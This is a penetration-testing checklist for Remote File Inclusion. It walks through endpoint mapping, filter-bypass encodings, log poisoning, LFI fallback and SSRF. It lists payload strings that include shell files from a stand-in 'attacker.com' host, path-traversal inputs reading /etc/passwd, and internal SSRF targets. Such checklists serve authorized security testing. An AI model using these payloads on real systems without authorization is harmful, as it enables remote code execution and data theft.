1.  **Initial Information Gathering**
    - [ ] Identify and map all endpoints that accept file path or URL inputs.
    - [ ] Review source code (if available) to understand file handling mechanisms.
    - [ ] Check for endpoints where URLs or file paths are passed as parameters in URLs, headers, or body.

2.  **Basic RFI Testing**
    - [ ] `http://Attacker.com/shell.txt`
    - [ ] `http://Attacker.com/shell.php`
    - [ ] `ftp://Attacker.com/shell.txt`
    - [ ] `ftp://Attacker.com/shell.php`
    - [ ] Try including remote files hosted on different servers.

3.  **URL Manipulation**
    - [ ] Use different URL schemes (`HTTP`, `HTTPS`, `FTP`).
    - [ ] Use different file extensions (e.g., `.txt`, `.php`, `.jpg`).
    - Test bypass techniques for URL filters and restrictions:
        - [ ] Using URL encoding: `http%3A%2F%2Fattacker.com%2Fshell.txt`
        - [ ] Using double URL encoding: `http%253A%252F%252Fattacker.com%252Fshell.txt`
        - [ ] Using mixed case URL encoding: `hTtP://aTtAcKeR.com/sHeLl.TxT`

4.  **Advanced URL Manipulation Techniques**
    - [ ] Test for double encoding vulnerabilities.
    - [ ] Try bypassing filters with non-standard encodings and mixed encodings.
    - Use variations of URLs to bypass filters:
        - [ ] `http://attacker.com/shell.txt%00.jpg`
        - [ ] `http://attacker.com/shell.txt?.jpg`
        - [ ] `http://attacker.com/shell.txt#.jpg`

5.  **File Upload and Inclusion**
    - [ ] Check if file upload functionalities are present and try uploading files for inclusion.
    - [ ] Test inclusion of uploaded files to execute code (e.g., web shells).

6.  **Log Poisoning and Inclusion**
    - [ ] Inject payload into User-Agent, Referer, or other headers.
    - [ ] Include poisoned log files to execute injected payloads.

7.  **Error Handling and Response Analysis**
    - [ ] Analyze server responses for clues about the presence of RFI vulnerabilities.
    - [ ] Look for error messages that disclose file paths or other sensitive information.
    - [ ] Verify if application stack traces are exposed in responses.

8.  **Local File Inclusion (LFI) Fallback Testing**
    - [ ] If RFI is not possible, test for Local File Inclusion (LFI) vulnerabilities.
    - Test common LFI payloads to include local files:
        - [ ] `../../../../etc/passwd`
        - [ ] `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
        - [ ] `../../../../../../../../../../../etc/passwd`

9.  **Server-Side Request Forgery (SSRF)**
    - [ ] Test for SSRF vulnerabilities that can be exploited to achieve RFI.
    - Attempt to include internal resources via SSRF:
        - [ ] `http://localhost:8080/`
        - [ ] `http://127.0.0.1/`
        - [ ] `http://internal-service/`
